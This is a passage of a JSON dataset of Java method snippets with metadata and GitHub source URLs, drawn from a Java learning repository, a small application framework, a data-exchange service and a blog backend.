"ItemUpgradeBlank", "implements": null, "modifiers": ["public"]}}, {"id": 58572, "method_name": "printString", "class_name": "Demo01ObjectMethodReference", "params": ["Printable"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void printString(Printable p){\n        p.print(\"Hello\");\n    }", "url": "https://raw.githubusercontent.com/liuminchao123/JavaWeb_Learning/master/02.%20java/Java/%E9%BB%91%E9%A9%AC%E6%95%99%E7%A8%8B/24.%E3%80%90Stream%E6%B5%81%E3%80%81%E6%96%B9%E6%B3%95%E5%BC%95%E7%94%A8%E3%80%91%E7%AC%94%E8%AE%B0/code/13_StreamAndMethodReference/src/com/itheima/demo05/ObjectMethodReference/Demo01ObjectMethodReference.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58573, "method_name": "main", "class_name": "Demo01ObjectMethodReference", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) {\n        //\u8c03\u7528printString\u65b9\u6cd5,\u65b9\u6cd5\u7684\u53c2\u6570Printable\u662f\u4e00\u4e2a\u51fd\u6570\u5f0f\u63a5\u53e3,\u6240\u4ee5\u53ef\u4ee5\u4f20\u9012Lambda\u8868\u8fbe\u5f0f\n        printString((s)->{\n            //\u521b\u5efaMethodRerObject\u5bf9\u8c61\n            MethodRerObject obj = new MethodRerObject();\n            //\u8c03\u7528MethodRerObject\u5bf9\u8c61\u4e2d\u7684\u6210\u5458\u65b9\u6cd5printUpperCaseString,\u628a\u5b57\u7b26\u4e32\u6309\u7167\u5927\u5199\u8f93\u51fa\n            obj.printUpperCaseString(s);\n        });\n\n        /*\n            \u4f7f\u7528\u65b9\u6cd5\u5f15\u7528\u4f18\u5316Lambda\n            \u5bf9\u8c61\u662f\u5df2\u7ecf\u5b58\u5728\u7684MethodRerObject\n            \u6210\u5458\u65b9\u6cd5\u4e5f\u662f\u5df2\u7ecf\u5b58\u5728\u7684printUpperCaseString\n            \u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u5bf9\u8c61\u540d\u5f15\u7528\u6210\u5458\u65b9\u6cd5\n         */\n        //\u521b\u5efaMethodRerObject\u5bf9\u8c61\n        MethodRerObject obj = new MethodRerObject();\n        printString(obj::printUpperCaseString);\n    }", "url": "https://raw.githubusercontent.com/liuminchao123/JavaWeb_Learning/master/02.%20java/Java/%E9%BB%91%E9%A9%AC%E6%95%99%E7%A8%8B/24.%E3%80%90Stream%E6%B5%81%E3%80%81%E6%96%B9%E6%B3%95%E5%BC%95%E7%94%A8%E3%80%91%E7%AC%94%E8%AE%B0/code/13_StreamAndMethodReference/src/com/itheima/demo05/ObjectMethodReference/Demo01ObjectMethodReference.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58574, "method_name": "execute", "class_name": "RemoveMaxs", "params": ["Map<String,Clazz>", "boolean"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean execute(Map<String, Clazz> classes, boolean verbose) {\n    classes.values().stream().map(c -> c.node.methods).flatMap(List::stream).forEach(m -> m.maxLocals = m.maxStack = 1337);\n    logger.info(\"Removed frame limits\");\n    return true;\n  }", "url": "https://raw.githubusercontent.com/GraxCode/threadtear/master/src/me/nov/threadtear/execution/tools/RemoveMaxs.java", "stars": "140", "class_props": {"extends": "Execution", "implements": null, "modifiers": ["public"]}}, {"id": 58575, "method_name": "requireArgument", "class_name": "Apex", "params": ["boolean", "String", "Object"], "throws": null, "modifiers": ["static"], "return_type": "void", "snippet": "  static void requireArgument(boolean expression, String template, Object... args) {\n    if (!expression) {\n      throw new IllegalArgumentException(String.format(template, args));\n    }\n  }", "url": "https://raw.githubusercontent.com/AquiverV/apex/master/src/main/java/org/apex/Apex.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 58576, "method_name": "requireArgument", "class_name": "Apex", "params": ["boolean"], "throws": null, "modifiers": ["static"], "return_type": "void", "snippet": "  static void requireArgument(boolean expression) {\n    if (!expression) {\n      throw new IllegalArgumentException();\n    }\n  }", "url": "https://raw.githubusercontent.com/AquiverV/apex/master/src/main/java/org/apex/Apex.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 58577, "method_name": "requireState", "class_name": "Apex", "params": ["boolean"], "throws": null, "modifiers": ["static"], "return_type": "void", "snippet": "  static void requireState(boolean expression) {\n    if (!expression) {\n      throw new IllegalStateException();\n    }\n  }", "url": "https://raw.githubusercontent.com/AquiverV/apex/master/src/main/java/org/apex/Apex.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 58578, "method_name": "requireState", "class_name": "Apex", "params": ["boolean", "String", "Object"], "throws": null, "modifiers": ["static"], "return_type": "void", "snippet": "  static void requireState(boolean expression, String template, Object... args) {\n    if (!expression) {\n      throw new IllegalStateException(String.format(template, args));\n    }\n  }", "url": "https://raw.githubusercontent.com/AquiverV/apex/master/src/main/java/org/apex/Apex.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 58579, "method_name": "of", "class_name": "Apex", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "Apex", "snippet": "  public static Apex of() {\n    return new Apex();\n  }", "url": "https://raw.githubusercontent.com/AquiverV/apex/master/src/main/java/org/apex/Apex.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 58580, "method_name": "verbose", "class_name": "Apex", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean verbose() {\n    return this.verbose;\n  }", "url": "https://raw.githubusercontent.com/AquiverV/apex/master/src/main/java/org/apex/Apex.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 58581, "method_name": "realtimeLogging", "class_name": "Apex", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean realtimeLogging() {\n    return this.realtimeLogging;\n  }", "url": "https://raw.githubusercontent.com/AquiverV/apex/master/src/main/java/org/apex/Apex.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 58582, "method_name": "environment", "class_name": "Apex", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Environment", "snippet": "  public Environment environment() {\n    return environment;\n  }", "url": "https://raw.githubusercontent.com/AquiverV/apex/master/src/main/java/org/apex/Apex.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 58583, "method_name": "masterConfig", "class_name": "Apex", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "  public boolean masterConfig() {\n    return masterConfig;\n  }", "url": "https://raw.githubusercontent.com/AquiverV/apex/master/src/main/java/org/apex/Apex.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 58584, "method_name": "envName", "class_name": "Apex", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String envName() {\n    return envName;\n  }", "url": "https://raw.githubusercontent.com/AquiverV/apex/master/src/main/java/org/apex/Apex.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 58585, "method_name": "bootCls", "class_name": "Apex", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Class<?>", "snippet": "  public Class<?> bootCls() {\n    return bootCls;\n  }", "url": "https://raw.githubusercontent.com/AquiverV/apex/master/src/main/java/org/apex/Apex.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 58586, "method_name": "mainArgs", "class_name": "Apex", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "  public String[] mainArgs() {\n    return mainArgs;\n  }", "url": "https://raw.githubusercontent.com/AquiverV/apex/master/src/main/java/org/apex/Apex.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 58587, "method_name": "discoverer", "class_name": "Apex", "params": ["Discoverer"], "throws": null, "modifiers": ["public"], "return_type": "Apex", "snippet": "  public Apex discoverer(Discoverer discoverer) {\n    requireArgument(this.discoverer == null, \"Discoverer can't be null\");\n    this.discoverer = Objects.requireNonNull(discoverer);\n    return this;\n  }", "url": "https://raw.githubusercontent.com/AquiverV/apex/master/src/main/java/org/apex/Apex.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 58588, "method_name": "packages", "class_name": "Apex", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Apex", "snippet": "  public Apex packages(String scanPath) {\n    requireArgument(scanPath.contains(\".\"), \"Need correct format\");\n    this.scanPath = Objects.requireNonNull(scanPath);\n    this.packages.add(Objects.requireNonNull(scanPath));\n    return this;\n  }", "url": "https://raw.githubusercontent.com/AquiverV/apex/master/src/main/java/org/apex/Apex.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 58589, "method_name": "packages", "class_name": "Apex", "params": ["Collection<String>"], "throws": null, "modifiers": ["public"], "return_type": "Apex", "snippet": "  public Apex packages(Collection<String> packages) {\n    if (!packages.isEmpty()) {\n      this.packages.addAll(packages);\n    }\n    return this;\n  }", "url": "https://raw.githubusercontent.com/AquiverV/apex/master/src/main/java/org/apex/Apex.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 58590, "method_name": "skipPath", "class_name": "Apex", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Apex", "snippet": "  public Apex skipPath(String skipPath) {\n    requireArgument(skipPath.contains(\".\"), \"Need correct format\");\n    this.skipPaths.add(Objects.requireNonNull(skipPath));\n    return this;\n  }", "url": "https://raw.githubusercontent.com/AquiverV/apex/master/src/main/java/org/apex/Apex.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 58591, "method_name": "skipPath", "class_name": "Apex", "params": ["Collection<String>"], "throws": null, "modifiers": ["public"], "return_type": "Apex", "snippet": "  public Apex skipPath(Collection<String> skipPaths) {\n    if (!skipPaths.isEmpty()) {\n      this.skipPaths.addAll(skipPaths);\n    }\n    return this;\n  }", "url": "https://raw.githubusercontent.com/AquiverV/apex/master/src/main/java/org/apex/Apex.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 58592, "method_name": "removeListener", "class_name": "Apex", "params": ["RemoveListener<K,V>"], "throws": null, "modifiers": ["public"], "return_type": "Apex", "snippet": "  public <K, V> Apex removeListener(RemoveListener<K, V> removeListener) {\n    requireArgument(removeListener != null, \"RemoveListener can't be null\");\n    RemoveListener<K, V> kvRemoveListener = requireNonNull(removeListener);\n    return this;\n  }", "url": "https://raw.githubusercontent.com/AquiverV/apex/master/src/main/java/org/apex/Apex.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 58593, "method_name": "environment", "class_name": "Apex", "params": ["Environment"], "throws": null, "modifiers": ["public"], "return_type": "Apex", "snippet": "  public Apex environment(Environment environment) {\n    requireArgument(this.environment == null, \"Environment can't be null\");\n    this.environment = Objects.requireNonNull(environment);\n    return this;\n  }", "url": "https://raw.githubusercontent.com/AquiverV/apex/master/src/main/java/org/apex/Apex.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 58594, "method_name": "resolver", "class_name": "Apex", "params": ["BeanResolver"], "throws": null, "modifiers": ["public"], "return_type": "Apex", "snippet": "  public Apex resolver(BeanResolver beanResolver) {\n    requireArgument(this.beanResolver == null, \"BeanResolver can't be null\");\n    this.beanResolver = Objects.requireNonNull(beanResolver);\n    return this;\n  }", "url": "https://raw.githubusercontent.com/AquiverV/apex/master/src/main/java/org/apex/Apex.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 58595, "method_name": "options", "class_name": "Apex", "params": ["Options"], "throws": null, "modifiers": ["public"], "return_type": "Apex", "snippet": "  public Apex options(Options options) {\n    requireArgument(this.options == null, \"Optional can't be null\");\n    this.options = Objects.requireNonNull(options);\n    return this;\n  }", "url": "https://raw.githubusercontent.com/AquiverV/apex/master/src/main/java/org/apex/Apex.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 58596, "method_name": "start", "class_name": "Apex", "params": ["Class<T>", "String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "  public <T> void start(Class<T> bootCls, String[] mainArgs) {\n    requireNonNull(bootCls, \"Apex needs to specify the startup class when starting.\");\n\n    Optional.of(options).orElseGet(this::buildOptions);\n\n    this.bootCls = bootCls;\n    this.scanPath = bootCls.getPackageName();\n\n    try {\n      this.loadConfig(mainArgs);\n      this.singleExecutor();\n    } catch (IllegalAccessException e) {\n      log.error(\"An exception occurred while loading the configuration\", e);\n    }\n    try {\n      final Thread bootThread = new Thread(performScan());\n      final String threadName = this.environment.get(PATH_APP_THREAD_NAME, SERVER_THREAD_NAME);\n      bootThread.setName(threadName);\n      this.singleExecutor.execute(bootThread);\n    } catch (Exception e) {\n      log.error(\"Bean resolve be exception:\", e);\n    }\n  }", "url": "https://raw.githubusercontent.com/AquiverV/apex/master/src/main/java/org/apex/Apex.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 58597, "method_name": "singleExecutor", "class_name": "Apex", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void singleExecutor() {\n    this.singleExecutor = Executors.newCachedThreadPool(\n            new ApexThreadFactory(SINGLE_EXECUTOR_NAME));\n  }", "url": "https://raw.githubusercontent.com/AquiverV/apex/master/src/main/java/org/apex/Apex.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 58598, "method_name": "buildOptions", "class_name": "Apex", "params": [], "throws": null, "modifiers": ["private"], "return_type": "ClassgraphOptions", "snippet": "  private ClassgraphOptions buildOptions() {\n    return ClassgraphOptions.builder()\n            .verbose(verbose)\n            .scanPackages(packages)\n            .skipPackages(skipPaths)\n            .realtimeLogging(realtimeLogging)\n            .build();\n  }", "url": "https://raw.githubusercontent.com/AquiverV/apex/master/src/main/java/org/apex/Apex.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 58599, "method_name": "performScan", "class_name": "Apex", "params": [], "throws": null, "modifiers": ["private"], "return_type": "Runnable", "snippet": "  private Runnable performScan() {\n    return () -> {\n      if (Objects.isNull(discoverer)) this.discoverer = new ClassgraphDiscoverer(options);\n      Set<Class<?>> discover = this.discoverer.discover(scanPath);\n      Optional.of(beanResolver).orElseGet(DefaultBeanResolver::new);\n      this.beanResolver.resolve(discover);\n    };\n  }", "url": "https://raw.githubusercontent.com/AquiverV/apex/master/src/main/java/org/apex/Apex.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 58600, "method_name": "loadConfig", "class_name": "Apex", "params": ["String"], "throws": ["IllegalAccessException"], "modifiers": ["private"], "return_type": "void", "snippet": "  private void loadConfig(String[] args) throws IllegalAccessException {\n    String bootConf = environment().get(PATH_SERVER_BOOT_CONFIG, PATH_CONFIG_PROPERTIES);\n    Environment bootConfEnv = Environment.of(bootConf);\n\n    Map<String, String> argsMap = this.loadMainArgs(args);\n    Map<String, String> constField = PropertyUtils.confFieldMap();\n\n    this.loadPropsOrYaml(bootConfEnv, constField);\n\n    if (!requireNonNull(bootConfEnv).isEmpty()) {\n      Map<String, String> bootEnvMap = bootConfEnv.toStringMap();\n      Set<Map.Entry<String, String>> entrySet = bootEnvMap.entrySet();\n      entrySet.forEach(entry -> this.environment.add(entry.getKey(), entry.getValue()));\n      this.masterConfig = true;\n    }\n\n    if (argsMap.get(PATH_SERVER_PROFILE) != null) {\n      String envNameArg = argsMap.get(PATH_SERVER_PROFILE);\n      this.envConfig(envNameArg);\n      this.envName = envNameArg;\n      argsMap.remove(PATH_SERVER_PROFILE);\n      this.envConfig = true;\n    }\n\n    if (!envConfig) {\n      String profileName = this.environment.get(PATH_SERVER_PROFILE);\n      if (profileName != null && !profileName.equals(\"\")) {\n        envConfig(profileName);\n        this.envName = profileName;\n      }\n    }\n  }", "url": "https://raw.githubusercontent.com/AquiverV/apex/master/src/main/java/org/apex/Apex.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 58601, "method_name": "loadPropsOrYaml", "class_name": "Apex", "params": ["Environment", "Map<String,String>"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void loadPropsOrYaml(Environment bootConfEnv, Map<String, String> constField) {\n    /** Properties are configured by default, and the\n     * properties loaded by default are application.properties.*/\n    constField.keySet().forEach(key ->\n            Optional.ofNullable(System.getProperty(constField.get(key)))\n                    .ifPresent(property -> bootConfEnv.add(key, property)));\n\n    /** If there is no properties configuration, the yaml\n     * format is used, and the default yaml loaded is application.yml */\n    if (bootConfEnv.isEmpty()) {\n      Optional.ofNullable(PropertyUtils.yaml(PATH_CONFIG_YAML))\n              .ifPresent(yamlConfigTreeMap ->\n                      bootConfEnv.load(new StringReader(\n                              PropertyUtils.toProperties(yamlConfigTreeMap))));\n    }\n  }", "url": "https://raw.githubusercontent.com/AquiverV/apex/master/src/main/java/org/apex/Apex.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 58602, "method_name": "loadMainArgs", "class_name": "Apex", "params": ["String"], "throws": null, "modifiers": ["private"], "return_type": "Map<String,String>", "snippet": "  private Map<String, String> loadMainArgs(String[] args) {\n    Map<String, String> argsMap = PropertyUtils.parseArgs(args);\n    if (argsMap.size() > 0) {\n      this.mainArgs = args;\n      log.info(\"Entered command line:{}\", argsMap.toString());\n    }\n\n    for (Map.Entry<String, String> next : argsMap.entrySet()) {\n      this.environment.add(next.getKey(), next.getValue());\n    }\n    return argsMap;\n  }", "url": "https://raw.githubusercontent.com/AquiverV/apex/master/src/main/java/org/apex/Apex.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 58603, "method_name": "envConfig", "class_name": "Apex", "params": ["String"], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "  private void envConfig(String envName) {\n    String envFileName = \"application\" + \"-\" + envName + \".properties\";\n    Environment customerEnv = Environment.of(envFileName);\n    if (customerEnv.isEmpty()) {\n      String envYmlFileName = \"application\" + \"-\" + envName + \".yml\";\n      customerEnv = Environment.of(envYmlFileName);\n    }\n    if (!customerEnv.isEmpty()) {\n      customerEnv.props().forEach((key, value) -> this.environment.add(key.toString(), value));\n    }\n    this.environment.add(PATH_SERVER_PROFILE, envName);\n  }", "url": "https://raw.githubusercontent.com/AquiverV/apex/master/src/main/java/org/apex/Apex.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["final", "public"]}}, {"id": 58604, "method_name": "getId", "class_name": "QueueInfo", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getId() {\n        return id;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/queue/domain/QueueInfo.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58605, "method_name": "setId", "class_name": "QueueInfo", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setId(int id) {\n        this.id = id;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/queue/domain/QueueInfo.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58606, "method_name": "getqName", "class_name": "QueueInfo", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getqName() {\n        return qName;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/queue/domain/QueueInfo.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58607, "method_name": "setqName", "class_name": "QueueInfo", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setqName(String qName) {\n        this.qName = qName;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/queue/domain/QueueInfo.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58608, "method_name": "getDescription", "class_name": "QueueInfo", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getDescription() {\n        return description;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/queue/domain/QueueInfo.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58609, "method_name": "setDescription", "class_name": "QueueInfo", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setDescription(String description) {\n        this.description = description;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/queue/domain/QueueInfo.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58610, "method_name": "getPriority", "class_name": "QueueInfo", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getPriority() {\n        return priority;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/queue/domain/QueueInfo.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58611, "method_name": "setPriority", "class_name": "QueueInfo", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setPriority(int priority) {\n        this.priority = priority;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/queue/domain/QueueInfo.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58612, "method_name": "isLock", "class_name": "QueueInfo", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isLock() {\n        return isLock;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/queue/domain/QueueInfo.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58613, "method_name": "setLock", "class_name": "QueueInfo", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setLock(boolean lock) {\n        isLock = lock;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/queue/domain/QueueInfo.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58614, "method_name": "getLockHost", "class_name": "QueueInfo", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getLockHost() {\n        return lockHost;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/queue/domain/QueueInfo.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58615, "method_name": "setLockHost", "class_name": "QueueInfo", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setLockHost(String lockHost) {\n        this.lockHost = lockHost;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/queue/domain/QueueInfo.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58616, "method_name": "getLockTime", "class_name": "QueueInfo", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Date", "snippet": "    public Date getLockTime() {\n        return lockTime;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/queue/domain/QueueInfo.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58617, "method_name": "setLockTime", "class_name": "QueueInfo", "params": ["Date"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setLockTime(Date lockTime) {\n        this.lockTime = lockTime;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/queue/domain/QueueInfo.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58618, "method_name": "getCreateTime", "class_name": "QueueInfo", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Date", "snippet": "    public Date getCreateTime() {\n        return createTime;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/queue/domain/QueueInfo.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58619, "method_name": "setCreateTime", "class_name": "QueueInfo", "params": ["Date"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setCreateTime(Date createTime) {\n        this.createTime = createTime;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/service/src/main/java/com/webank/wedatasphere/exchangis/queue/domain/QueueInfo.java", "stars": "23", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58620, "method_name": "addArticle", "class_name": "ContentServiceImpl", "params": ["ContentDomain"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void addArticle(ContentDomain contentDomain) {\n        if (null == contentDomain)\n            throw BusinessException.withErrorCode(ErrorConstant.Common.PARAM_IS_EMPTY);\n        if (StringUtils.isBlank(contentDomain.getTitle()))\n            throw BusinessException.withErrorCode(ErrorConstant.Article.TITLE_CAN_NOT_EMPTY);\n        if (contentDomain.getTitle().length() > WebConst.MAX_TITLE_COUNT)\n            throw BusinessException.withErrorCode(ErrorConstant.Article.TITLE_IS_TOO_LONG);\n        if (StringUtils.isBlank(contentDomain.getContent()))\n            throw BusinessException.withErrorCode(ErrorConstant.Article.CONTENT_CAN_NOT_EMPTY);\n        if (contentDomain.getContent().length() > WebConst.MAX_TEXT_COUNT)\n            throw BusinessException.withErrorCode(ErrorConstant.Article.CONTENT_IS_TOO_LONG);\n\n        //\u6807\u7b7e\u548c\u5206\u7c7b\n        String tags = contentDomain.getTags();\n        String categories = contentDomain.getCategories();\n\n        contentDao.addArticle(contentDomain);\n\n        int cid = contentDomain.getCid();\n        metaService.addMetas(cid, tags, Types.TAG.getType());\n        metaService.addMetas(cid, categories, Types.CATEGORY.getType());\n    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/serviceImp/ContentServiceImpl.java", "stars": "2", "class_props": {"extends": null, "implements": ["ContentService"], "modifiers": ["public"]}}, {"id": 58621, "method_name": "deleteArticleById", "class_name": "ContentServiceImpl", "params": ["Integer"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void deleteArticleById(Integer cid) {\n        if (null == cid)\n            throw BusinessException.withErrorCode(ErrorConstant.Common.PARAM_IS_EMPTY);\n        contentDao.deleteArticleById(cid);\n        //\u540c\u65f6\u4e5f\u8981\u5220\u9664\u8be5\u6587\u7ae0\u4e0b\u7684\u6240\u6709\u8bc4\u8bba\n        List<CommentDomain> comments = commentDao.getCommentsByCId(cid);\n        if (null != comments && comments.size() > 0){\n            comments.forEach(comment ->{\n                commentDao.deleteComment(comment.getCoid());\n            });\n        }\n        //\u5220\u9664\u6807\u7b7e\u548c\u5206\u7c7b\u5173\u8054\n        List<RelationShipDomain> relationShips = relationShipDao.getRelationShipByCid(cid);\n        if (null != relationShips && relationShips.size() > 0){\n            relationShipDao.deleteRelationShipByCid(cid);\n        }\n\n    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/serviceImp/ContentServiceImpl.java", "stars": "2", "class_props": {"extends": null, "implements": ["ContentService"], "modifiers": ["public"]}}, {"id": 58622, "method_name": "updateArticleById", "class_name": "ContentServiceImpl", "params": ["ContentDomain"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void updateArticleById(ContentDomain contentDomain) {\n        //\u6807\u7b7e\u548c\u5206\u7c7b\n        String tags = contentDomain.getTags();\n        String categories = contentDomain.getCategories();\n\n        contentDao.updateArticleById(contentDomain);\n        int cid = contentDomain.getCid();\n        relationShipDao.deleteRelationShipByCid(cid);\n        metaService.addMetas(cid, tags, Types.TAG.getType());\n        metaService.addMetas(cid, categories, Types.CATEGORY.getType());\n\n    }", "url": "https://raw.githubusercontent.com/chenval/my-site/master/src/main/java/cn/blog/serviceImp/ContentServiceImpl.java", "stars": "2", "class_props": {"extends": null, "implements": ["ContentService"], "modifiers": ["public"]}}, {"id": 58623, "method_name": "updateCategory", "class_name": "ContentServiceImpl", "params": ["String", "String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void updateCategory(String ordinal, String newCatefory) {\n        ContentCond cond = new ContentCond();\n        cond.setCategory(ordinal);\n        List<ContentDomain> atricles = contentDao.getArticlesByCond(cond);\n        atricles.forEach(atricle -> {\n            atricle.setCategories(atricle.getCategories().replace(ordinal, newCatefory));\n            contentDao.updateArticleById(atricle);\n        });\n    }", "url": 